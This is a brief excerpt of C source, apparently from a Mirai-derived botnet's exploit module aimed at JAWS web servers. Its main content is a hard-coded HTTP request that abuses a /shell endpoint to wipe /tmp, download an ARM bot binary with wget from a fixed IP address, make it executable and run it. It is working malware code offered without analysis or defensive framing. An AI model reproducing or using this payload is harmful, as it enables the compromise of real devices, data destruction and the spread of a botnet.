            ...
            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if (err == 0 && ret == 0)
                {
                    if (conn->state == jaws_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "GET /shell?cd+/tmp;rm+-rf+*;wget+192.154.229.223/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 192.154.229.223:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n");
